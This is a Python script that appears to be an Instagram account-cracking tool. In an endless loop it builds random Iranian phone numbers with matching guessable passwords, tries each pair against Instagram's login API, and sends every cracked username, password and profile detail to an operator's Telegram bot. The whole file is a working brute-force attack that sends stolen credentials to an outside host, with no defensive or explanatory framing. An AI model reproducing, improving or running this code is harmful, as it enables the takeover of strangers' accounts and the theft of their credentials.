import os
import pyfiglet
os.system('clear')
try:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    aa = 0
    zz = 0
    ss = 0
    E = '\x1b[1;31m'
    G = '\x1b[1;32m'
    S = '\x1b[1;33m'
    Z = '\x1b[1;31m'
    X = '\x1b[1;33m'
    Z1 = '\x1b[2;31m'
    V = '\033[1;90m'
    F = "\033[1;92m"
    A = '\x1b[2;34m'
    I = '\x1b[2;33m'
    B = '\x1b[2;32m'
    Y = '\x1b[1;34m'
    R = "\033[1;91m"
    J = '\033[1;94m'
    i = "\033[1;90m"
    K = "\033[1;94m"
    C = "\033[1;97m"
    import time
    timee = time.asctime()
    t = time.localtime()
    import webbrowser
    webbrowser.open('http/t.me/T2R_9')
    current_time = time.strftime('%H:%M:%S', t)
    print (f"""

  {C}██{E}╗{C}███{E}╗   {C}██{E}╗{C}███████{E}╗{C}████████{E}╗ {C}█████{E}╗ 
  {C}██{E}║{C}████{E}╗  {C}██{E}║{C}██{E}╔════╝╚══{C}██{E}╔══╝{C}██{E}╔══{C}██{E}╗
  {C}██{E}║{C}██{E}╔{C}██{E}╗ {C}██{E}║{C}███████{E}╗   {C}██{E}║   {C}███████{E}║
  {C}██{E}║{C}██{E}║╚{C}██{E}╗{C}██{E}║╚════{C}██{E}║   {C}██{E}║   {C}██{E}╔══{C}██{E}║
  {C}██{E}║{C}██{E}║ ╚{C}████{E}║{C}███████{E}║   {C}██{E}║   {C}██{E}║  {C}██{E}║
  {E}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝{A}                                                                                        """)
    def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.1)            
    a(G+' [⌯] Enter TOKEN ')
    print ("""
""")
    tok = input (S+"     >> "+I)
    os.system('clear')
    a(A+' Enter ID ')
    print ("""
""")
    ID = input (A+"     >> "+I)
    sleep(0.1)
    os.system('clear')    
    start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=⌗ KAKASHI @T2R_9").json()
    id_msg = start_msg['result']['message_id']

    def code_joo(userQ, password):
        cookie = secrets.token_hex(8) * 2
        head = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
        req_id = requests.get(url_id, headers=head).json()
        name    = str(req_id['graphql']['user']['full_name'])
        id    = str(req_id['graphql']['user']['id'])
        followes    = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following    = str(req_id['graphql']['user']['edge_follow']['count'])
        isp    = str(req_id['graphql']['user']['is_private'])       
        bio    = str(req_id['graphql']['user']['biography'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}") 
        ree = re.json()
        dat = ree['data']
        t = time.localtime()
        current_time = time.strftime('%H:%M:%S', t)
        joo3 = (f""" 
        
𝗡𝗘𝗪 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗜𝗠
= = = = = = = = = = = = = = =
⌯ 𝙽𝙰𝙼𝙴 : {name}
⌯ 𝚄𝚂𝙴𝚁 : {userQ}
⌯ 𝙿𝙰𝚂𝚂 : {password}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂: {followes}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 : {following}
⌯ 𝙳𝙰𝚃𝙰 : {dat}
⌯ 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 : {isp} 
⌯ 𝙱𝙸𝙾  : {bio} 
= = = = = = = = = = = = = = =
⌯ 𝒇𝒓𝒐𝒎 : @T2R_9 """)
        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {joo3} \n"
        i = requests.post(tlg)
        print(G + joo3)        
    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing',  'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
    T2R_9 = '0987654321'
    while True:
        us = str(''.join((random.choice(T2R_9) for i in range(7))))
        username = '+98936' + us
        password = '0936' + us
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            code_joo(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():     
            print(f" {R} ({F}{username}{R}) : {R}({F}{username}{R})")
            print(R+"-----------------------------------")
            print(f""" ({F}-{R}) {F}Hit  {R}  : {F}{zz} 
 {R}({J}-{R}) {J}Bad  {R}  : {J}{aa}
 {R}({i}-{R}) {i}Error  {R}: {i}{ss}  """)
            print(R+"-----------------------------------")
            ss+=1
        else:
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=⌯ Hi New Itachi \n .- - - - - - - - - - - - .\n⌯ Bad [{aa}] \n⌯ Don [{zz}]\n⌯ Secure [{ss}] \n⌯ in User [{username}]\n. - - - - - - - - - - - - - .\n ⌯ Tele : @T2R_9")                     
            os.system('cls' if os.name == 'nt' else 'clear')
            print("""
\033[1;96m ------------------------
\033[1;32m < COD BY Itachi >
\033[1;96m ------------------------
\033[1;31m  ___ _             _     _ 
\033[1;31m |_ _| |_ __ _  ___| |__ (_)
\033[1;31m  | || __/ _` |/ __| '_ \| |
\033[1;31m  | || || (_| | (__| | | | |
\033[1;31m |___|\__\__,_|\___|_| |_|_|
\033[1;32m--------------------------------------------------
\033[1;95m
 Telegram   : https://t.me/T2R_9 
 Insta      : tahr1972
\033[1;32m
--------------------------------------------------
""" )            
            print(f" {R}({F}{username}{R}) : {R}({F}{password}{R})")
            print(R+"-----------------------------------")
            print(f""" ({F}-{R}) {F}Hit  {R}  : {F}{zz} 
 {R}({J}-{R}) {J}Bad  {R}  : {J}{aa}
 {R}({i}-{R}) {i}Error  {R}: {i}{ss}  """)
            print(R+"-----------------------------------")
            aa += 1